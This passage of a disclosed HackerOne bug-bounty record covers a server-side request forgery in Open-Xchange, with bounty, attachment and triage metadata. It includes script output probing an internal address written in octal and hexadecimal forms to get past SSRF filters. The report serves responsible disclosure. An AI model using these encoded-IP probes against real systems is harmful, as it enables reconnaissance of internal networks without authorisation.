[\u0026#39;CONNECTION REFUSED, PORT CLOSED\u0026#39;]\nIP Format: 030052000012  Response:  [\u0026#39;CONNECTION REFUSED, PORT CLOSED\u0026#39;]\nIP Format: 0xc0.0xa8.0x0.0xa  Response:  [\u0026#39;CONNECTION REFUSED, PORT CLOSED\u0026#39;]\nIP Format: 0xc0.0xa8.0xa  Response:  [\u0026#39;CONNECTION REFUSED, PORT CLOSED\u0026#39;]\nIP Format: 0xc0.0xa8000a  Response:  [\u0026#39;CONNECTION REFUSED, PORT CLOSED\u0026#39;]\nIP Format: 0xc0a8000a  Response:  [\u0026#39;CONNECTION REFUSED, PORT CLOSED\u0026#39;]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis is a limited SSRF in that you can only scan port 80/443 due to the port whitelist in place.  However, the results are more accurate than a blind response which is reliant on the HTTP response times to determine open ports.  Again, no data was able to be extracted, so this vulnerability is limited to reconnaissance only.\u003c/p\u003e\n","bounty_amount":"850.0","formatted_bounty":"$850","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":247927,"file_name":"script_output.txt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/247/927/ede2210bc3bd465b95ad5a9eccf2290ab47cab23/script_output.txt?response-content-disposition=attachment%3B%20filename%3D%22script_output.txt%22%3B%20filename%2A%3DUTF-8%27%27script_output.txt\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052806Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=9bec0e4e26adca43959d0f3b6fc8987900378173acd0f499600b6907c0b5f603","file_size":916,"type":"text/plain"},{"id":247928,"file_name":"poc.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/247/928/8c2c155e2b107bd40f55f90e6497ed649058fb9d/poc.png?response-content-disposition=attachment%3B%20filename%3D%22poc.png%22%3B%20filename%2A%3DUTF-8%27%27poc.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052806Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=de435c660f5acb6e0ee2ecf38126a6741922f9ba40d1eb24eeb1dc6ac0727b13","file_size":49875,"type":"image/png"},{"id":247931,"file_name":"request.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/247/931/01da0a0b00d2896e6d7c0f958ad544b71f50c06d/request.py?response-content-disposition=attachment%3B%20filename%3D%22request.py%22%3B%20filename%2A%3DUTF-8%27%27request.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXTSUKMQR%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052806Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICj7knYENMnZh5A0NglwhkrcefT2BpvxRPeuGap0VUVRAiAmn0d7G6cOHj4E%2FKnqMO8ijTpfdfQo0l3AXDA9%2BVALKyq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM%2FiUJtIxCtzL546wIKpEDje0AX20BGKjUrOSYKWZEdzHWjKRP8eQkcBUNH01qDuCwWFb492oSkH%2FEbtHYsr08fP7HLp%2BTd6LcNHSrDFB9d%2BFYETRUG%2BADKmSGmr3Nwq3xqOP7v1EpWK%2BMEc71vsf2gHyy2w59dToZZzlFf2LAOtvhw7zU2wPf4yKeKdDuOWSWY%2FYHF9%2FAyxR3PD619mcgslnZ5pnYBzX6KdEFvaj1f6s0iYObvLdLHSGri%2BDq6ie%2BP8QhqPHtP8GrAkyOULwf0RxusfkoOYlk6RCSPeGnc%2B%2F0xS4Z3WGTX1xspZfXd0eNVxbwMndOmyXOgV4rAgYhogZMCF8CUdB54myomh4lvN8GC6ZOidewqvFMUYwvJDtcv5pamoBOKfBja9zALg1XyMVI0veiuhxW3yKuxhVLdNKxYadV6pexYwarFA3FPF7h4jC%2F4kY3598KIMbOh7q27L9WfbepKiXnfyh29KSGWxJCVMqZfME%2F5fKTENVzxThmVhSuR%2BN%2FKLX7fsytnAWZSmFjtkQ0xLsf2eZqtVvhJBAwkdSq%2FwU67AHKBp0gQe3TLXIgmEnz83bIH2CwQkZMzah2yfBPWtq0ZmAtH%2B0SUMwvTFocxndYggkQSymMXlnMxSrW%2BShlOraR%2FvJ3Ray4%2FLsf09Cb2XaPSrPR5Wx1KvVAyb2Z18jluSP%2Fm5hPR5XJ4tbNBRxfzhgRI1u4O97hl5qsWT1DT7hNdHJ0BNkn7AUS4VJKTLipMdxmxf4j4xDx5eEMqe7Wr5xoy56daL76ywzY%2F7%2B2Yy7SSE3lpZivXSYx0hn1jJAOzsp%2BLLnwo599EX%2FHSD0E4ZBDvjofSUuw6iva2j9O%2BZyk3WJc%2FbmM7LEVw1QRhA%3D%3D\u0026X-Amz-Signature=7a92e844fc44f121a064af186c36cd30ccff4ebf8fb35aee73c866c603044af1","file_size":4512,"type":"text/x-python"}],"allow_singular_disclosure_at":null,"vote_count":32,"voters":["sultancad","mashoud1122","bl4de","base_64","sameerphad72","w2w","mygf","eveeez","an0nym0us","imranhudaa","and 22 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2234022,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for this very interesting find, i guess most are unaware that connection libs actually allow octal and hexadecimal IP formats.","markdown_message":"\u003cp\u003eThanks for this very interesting find, i guess most are unaware that connection libs actually allow octal and hexadecimal IP formats.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-19T10:38:23.665Z","updated_at":"2017-12-19T10:38:23.665Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2234044,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-19T10:55:46.284Z","updated_at":"2017-12-19T10:55:46.284Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2234228,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.","markdown_message":"\u003cp\u003eWe solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-19T12:54:12.162Z","updated_at":"2017-12-19T12:54:12.162Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"logan5","url":"/logan5"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2234230,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-19T12:54:57.931Z","updated_at":"2017-12-19T12:54:57.931Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"850.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"logan5","url":"/logan5"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2234619,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty and quick resolve!  Yes it was an interesting one, I did read that some libraries may even accept combinations of different formats as well.\n\nAll the best.","markdown_message":"\u003cp\u003eThanks for the bounty and quick resolve!  Yes it was an interesting one, I did read that some libraries may even accept combinations of different formats as well.\u003c/p\u003e\n\n\u003cp\u003eAll the best.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-19T14:50:59.046Z","updated_at":"2017-12-19T14:50:59.046Z","actor":{"username":"logan5","cleared":false,"url":"/logan5","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/110/421/4eacc0e36a20a036380e88612bb8755d1dddda08_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4916985,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-24T12:18:14.594Z","updated_at":"2019-05-24T12:18:14.594Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":401088},"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5253103,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-04T11:11:41.434Z","updated_at":"2019-07-04T11:11:41.434Z","first_to_agree":true,"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5253932,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-04T13:02:30.936Z","updated_at":"2019-07-04T13:02:30.936Z","actor":{"username":"logan5","cleared":false,"url":"/logan5","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/110/421/4eacc0e36a20a036380e88612bb8755d1dddda08_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5253933,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-04T13:02:31.032Z","updated_at":"2019-07-04T13:02:31.032Z","actor":{"username":"logan5","cleared":false,"url":"/logan5","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/110/421/4eacc0e36a20a036380e88612bb8755d1dddda08_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}